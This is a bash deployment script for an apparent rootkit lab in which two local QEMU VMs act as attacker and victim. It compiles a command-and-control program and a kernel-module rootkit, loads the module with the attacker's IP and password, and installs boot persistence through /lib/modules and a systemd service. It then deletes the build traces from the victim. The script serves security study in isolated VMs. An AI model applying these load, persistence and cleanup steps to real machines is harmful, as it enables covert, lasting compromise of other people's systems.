#!/bin/bash
# Deploy the attacking program and rootkit to their respective VMs.
# Modes:
#   ./deploy.sh        Full deployment: restart VMs, compile, load rootkit, setup persistence.
#   ./deploy.sh code   Code-only: compile and reload rootkit on running VMs (faster iteration).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
source "$ROOT_DIR/.env"
source "$ROOT_DIR/scripts/utils.sh"

VM_DIR="$ROOT_DIR/vms"
MODE="${1:-full}"

if [ "$MODE" != "full" ] && [ "$MODE" != "code" ]; then
    log_error "Usage: $0 [full|code]  (default: full)"
fi

deploy_attacking_program() {
    log_step "Deploying attacking_program to Attacker VM"
    ssh_attacker "pkill -f wlkom_control || true" 2>/dev/null || true
    ssh_attacker "rm -rf ~/attacking_program" 2>/dev/null || true
    scp_to_attacker -r "$ROOT_DIR/attacking_program" "$VM_USER@localhost:~/"
    ssh_attacker "cd ~/attacking_program && make clean && make"
    log_ok "attacking_program compiled"
}

deploy_rootkit() {
    log_step "Deploying rootkit to Victim VM"
    ssh_victim "sudo rmmod wlkom 2>/dev/null || true" || true
    ssh_victim "rm -rf ~/rootkit" 2>/dev/null || true
    scp_to_victim -r "$ROOT_DIR/rootkit" "$VM_USER@localhost:~/"

    log_info "Waiting for package manager to be free (up to 3 min)..."
    ssh_victim "for i in \$(seq 1 90); do sudo fuser /var/lib/dpkg/lock-frontend >/dev/null 2>&1 || break; sleep 2; done" || true
    ssh_victim "sudo dpkg --configure -a 2>/dev/null || true" || true

    log_info "Installing kernel headers..."
    ssh_victim "sudo apt-get install -y linux-headers-\$(uname -r)"

    log_info "Compiling rootkit..."
    ssh_victim "cd ~/rootkit && make clean && make"
    log_ok "Rootkit compiled"
}

load_rootkit() {
    log_step "Loading rootkit on Victim VM"
    ssh_victim "cd ~/rootkit && sudo insmod wlkom.ko control_ip=$ATTACKER_IP control_port=$CONTROL_PORT control_password=$CONTROL_PASSWORD"
    log_ok "Rootkit loaded"
}

setup_persistence() {
    log_step "Setting up persistence on Victim VM"

    local KVER SERVICE_FILE
    KVER=$(ssh_victim "uname -r")
    SERVICE_FILE="$(mktemp /tmp/wlkom.service.XXXXXX)"

    sed \
        -e "s/__KVER__/$KVER/g" \
        -e "s/__ATTACKER_IP__/$ATTACKER_IP/g" \
        -e "s/__CONTROL_PORT__/$CONTROL_PORT/g" \
        -e "s/__CONTROL_PASSWORD__/$CONTROL_PASSWORD/g" \
        "$ROOT_DIR/scripts/templates/wlkom.service" > "$SERVICE_FILE"

    scp_to_victim "$SERVICE_FILE" "$VM_USER@localhost:/tmp/wlkom.service"
    rm -f "$SERVICE_FILE"

    ssh_victim "bash -s" << 'REMOTE'
set -e
KO_DIR="/lib/modules/$(uname -r)/kernel/wlkom"
sudo mkdir -p "$KO_DIR"
sudo cp ~/rootkit/wlkom.ko "$KO_DIR/wlkom.ko"
sudo depmod -a
sudo mv /tmp/wlkom.service /etc/systemd/system/wlkom.service
sudo systemctl daemon-reload
sudo systemctl enable wlkom.service
REMOTE

    log_ok "Persistence configured (wlkom.service enabled)"
}

cleanup() {
    log_step "Cleaning build artifacts from Victim VM"
    ssh_victim "rm -rf ~/rootkit"
    log_ok "Cleaned"
}

wait_ssh() {
    local port="$1"
    local name="$2"

    log_step "Waiting for SSH on $name (port $port)..."
    local attempt=0
    while [ $attempt -lt 60 ]; do
        if ssh -i "$VM_DIR/wlkom_key" \
               -o StrictHostKeyChecking=no \
               -o ConnectTimeout=2 \
               -p "$port" "$VM_USER@localhost" "true" 2>/dev/null; then
            log_ok "SSH ready on $name"
            return 0
        fi
        attempt=$((attempt + 1))
        sleep 5
    done
    log_error "SSH timeout on $name after 5 min"
}

wait_cloud_init_vm() {
    local is_attacker="$1"
    local name="$2"

    log_step "Waiting for build tools on $name (up to 3 min)..."
    local attempt=0
    while [ $attempt -lt 90 ]; do
        if [ "$is_attacker" = "1" ]; then
            if ssh_attacker "gcc --version >/dev/null 2>&1" 2>/dev/null; then
                log_ok "Build tools ready on $name"
                return 0
            fi
        else
            if ssh_victim "make --version >/dev/null 2>&1" 2>/dev/null; then
                log_ok "Build tools ready on $name"
                return 0
            fi
        fi
        attempt=$((attempt + 1))
        sleep 2
    done
    log_warn "Build tools timeout on $name, proceeding anyway..."
}

kill_vms() {
    log_step "Killing any running VMs"
    pkill -f "qemu-system-x86_64.*WLKOM" || true

    # Wait for the QEMU socket to be fully released before starting new VMs
    local attempt=0
    while [ $attempt -lt 15 ]; do
        if ! ss -ltn 2>/dev/null | grep -q ":${SOCKET_PORT}"; then
            break
        fi
        attempt=$((attempt + 1))
        sleep 1
    done

    log_ok "VMs stopped"
}

start_vms() {
    log_step "Starting VMs"
    log_info "Starting Attacker VM (opens the QEMU socket)..."
    bash "$VM_DIR/start_vm.sh" attacker &

    # Wait for attacker's QEMU socket before starting victim
    log_info "Waiting for attacker socket on port ${SOCKET_PORT}..."
    local attempt=0
    while [ $attempt -lt 30 ]; do
        if ss -ltn 2>/dev/null | grep -q ":${SOCKET_PORT}"; then
            log_ok "Attacker socket ready"
            break
        fi
        attempt=$((attempt + 1))
        sleep 1
    done
    if [ $attempt -eq 30 ]; then
        log_warn "Socket not detected after 30s, starting victim anyway..."
    fi

    log_info "Starting Victim VM..."
    bash "$VM_DIR/start_vm.sh" victim &

    log_ok "VMs started"
}

print_next_steps() {
    log_step "Deployment complete"
    echo ""
    echo "  ⚠️  First time? Clear old SSH host keys (VMs have fresh keys):"
    echo "    ssh-keygen -f ~/.ssh/known_hosts -R '[localhost]:2222'"
    echo "    ssh-keygen -f ~/.ssh/known_hosts -R '[localhost]:2223'"
    echo ""
    echo "  Start the control server on attacker:"
    echo "    ssh -i $VM_DIR/wlkom_key $VM_USER@localhost -p $ATTACKER_SSH_PORT"
    echo "    cd ~/attacking_program && ./wlkom_control $CONTROL_PORT"
    echo "    (Password: wlk0m_s3cr3t)"
    echo ""
    echo "  The rootkit will connect automatically (retries every 5s)."
    echo ""
    echo "  Victim VM:"
    echo "    ssh -i $VM_DIR/wlkom_key $VM_USER@localhost -p $VICTIM_SSH_PORT"
    echo ""
}

main() {
    if [ "$MODE" = "full" ]; then
        log_step "Full deployment mode"
        kill_vms
        start_vms
        wait_ssh "$ATTACKER_SSH_PORT" "Attacker"
        wait_ssh "$VICTIM_SSH_PORT" "Victim"
        wait_cloud_init_vm "1" "Attacker"
        wait_cloud_init_vm "0" "Victim"
    else
        log_step "Code-only mode (reusing running VMs)"
    fi

    deploy_attacking_program
    deploy_rootkit
    load_rootkit

    if [ "$MODE" = "full" ]; then
        setup_persistence
        cleanup
        print_next_steps
    else
        log_ok "Code deployed and rootkit reloaded."
    fi
}

main
